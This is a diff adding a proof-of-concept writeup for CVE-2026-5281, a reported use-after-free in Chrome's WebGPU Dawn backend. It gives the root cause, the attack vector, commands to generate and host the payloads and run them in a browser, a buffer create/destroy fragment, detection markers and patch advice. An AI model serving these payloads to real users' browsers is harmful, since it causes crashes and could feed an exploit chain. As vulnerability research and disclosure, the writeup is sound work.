@@ -1,0 +1,174 @@
+# Chrome WebGPU Use-After-Free (CVE-2026-5281)
+
+<!-- 
+  File: 2026-05-18_chrome-webgpu-use-after-free.md
+  Location: pocs/web/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-18 |
+| **Last Updated** | 2026-04-02 |
+| **Author / Researcher** | umair-aziz025 (Umair Aziz) |
+| **CVE / Advisory** | CVE-2026-5281 |
+| **Category** | web |
+| **Severity** | High |
+| **CVSS Score** | 8.8 (CVSSv3) |
+| **Status** | Weaponized |
+| **Tags** | use-after-free, WebGPU, Chrome, Dawn, GPU, browser, unauthenticated |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Google Chrome / Chromium WebGPU (Dawn backend) |
+| **Versions Affected** | Chrome < 146.0.7680.178 |
+| **Language / Platform** | Python toolkit generating HTML/JavaScript WebGPU payloads; Windows-focused testing |
+| **Authentication Required** | No |
+| **Network Access Required** | Yes |
+
+---
+
+## Summary
+
+CVE-2026-5281 is a reported WebGPU use-after-free condition in Chrome's Dawn backend. The upstream toolkit provides an aggressive payload generator, scanner, and automated browser runner to reproduce crash-like GPU-failure signals and compare vulnerable vs patched behavior. In vulnerable builds, crafted WebGPU buffer lifecycle patterns can trigger GPU device loss/hang signals and browser instability, with potential downstream impact including denial of service and possible exploit-chain abuse.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+The research describes a lifetime-management flaw in WebGPU command/buffer handling where buffers can be destroyed and reallocated around pending GPU work. Under heavy command pressure, stale references can be exercised after free, creating a UAF-style memory safety condition in the graphics pipeline.
+
+### Attack Vector
+
+An attacker-controlled webpage serves JavaScript WebGPU logic that allocates many buffers, submits compute work, destroys buffers, and reuses similarly sized allocations to pressure reuse timing. Victim interaction is limited to opening the crafted page in a vulnerable browser build.
+
+### Impact
+
+Observed outcomes include GPU device-loss/hang states and renderer instability (denial of service). If combined with additional primitives in a real-world chain, memory corruption in browser GPU paths can increase risk of stronger outcomes such as code execution.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Windows lab host (researcher-controlled)
+Target:      Google Chrome below 146.0.7680.178
+Attacker:    Authorized researcher-controlled local host
+Tools:       Python 3.8+, Chromium-based browser, local HTTP server
+```
+
+### Setup Steps
+
+```bash
+# 1) Generate PoC artifacts
+python cve_2026_5281_exploit.py --generate-all --output ./poc_fixed
+
+# 2) Serve generated files
+python -m http.server 8080 -d ./poc_fixed
+
+# 3) Run automated browser behavior test
+python cve_2026_5281_automated_test.py --url "http://localhost:8080/exploit.html" --timeout 20
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Run local scanner** to classify installed Chrome version.
+   ```bash
+   python cve_2026_5281_scanner.py --local --json
+   ```
+2. **Generate and host payload artifacts** for controlled testing.
+   ```bash
+   python cve_2026_5281_exploit.py --generate-all --output ./_poc_output
+   python -m http.server 8080 -d ./_poc_output
+   ```
+3. **Execute automated run and evaluate logs** on vulnerable and patched builds.
+   ```bash
+   python cve_2026_5281_automated_test.py --url "http://localhost:8080/exploit.html" --timeout 20 --out-json ./evidence/run.json
+   python cve_2026_5281_scanner.py --assess-claim --vuln-log ./evidence/vulnerable_run.log --patched-log ./evidence/patched_run.log --vuln-version 146.0.7680.165 --patched-version 146.0.7680.178 --json
+   ```
+
+### Exploit Code
+
+> See `cve_2026_5281_exploit.py`, `cve_2026_5281_scanner.py`, and `cve_2026_5281_automated_test.py` in this folder.
+
+```python
+for i in range(200):
+    size = (64 + random.randint(0, 16320)) * 4
+    tempBuffers.append(gpuDevice.createBuffer({
+        "size": size,
+        "usage": GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST | GPUBufferUsage.COPY_SRC
+    }))
+
+for b in tempBuffers:
+    b.destroy()
+```
+
+### Expected Output
+
+```
+Vulnerable behavior: fatal GPU markers (device lost / crash detected) may appear.
+Patched behavior: no fatal GPU markers under the same harness.
+Scanner assessment: READY/PARTIAL/INSUFFICIENT based on captured evidence.
+```
+
+---
+
+## Screenshots / Evidence
+
+- `screenshots/` — add authorized lab evidence for vulnerable and patched runs
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+Potential markers in logs/telemetry:
+- "gpu device lost"
+- "crash detected"
+- "vulnerability confirmed"
+- "uncaught gpu error" with device lost/gpu hang/context lost variants
+```
+
+**SIEM / IDS Rule (example):**
+```
+Detect repeated WebGPU buffer create/destroy pressure patterns followed by
+browser GPU device-loss telemetry on vulnerable Chrome builds.
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Upgrade Chrome/Chromium to 146.0.7680.178 or newer |
+| **Workaround** | Restrict access to untrusted WebGPU content and disable risky lab-only flags outside controlled testing |
+| **Config Hardening** | Enforce rapid browser updates and monitor GPU crash/device-loss telemetry for anomaly response |
+
+---
+
+## References
+
+- [CVE-2026-5281 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-5281)
+- [Source Repository — umair-aziz025/CVE-2026-5281-Research-Toolkit](https://github.com/umair-aziz025/CVE-2026-5281-Research-Toolkit)
+- [Upstream Findings Report](https://github.com/umair-aziz025/CVE-2026-5281-Research-Toolkit/blob/main/CVE_2026_5281_FINDINGS_REPORT.md)
+
+---
+
+## Notes
+
+Auto-ingested from https://github.com/umair-aziz025/CVE-2026-5281-Research-Toolkit on 2026-05-18.
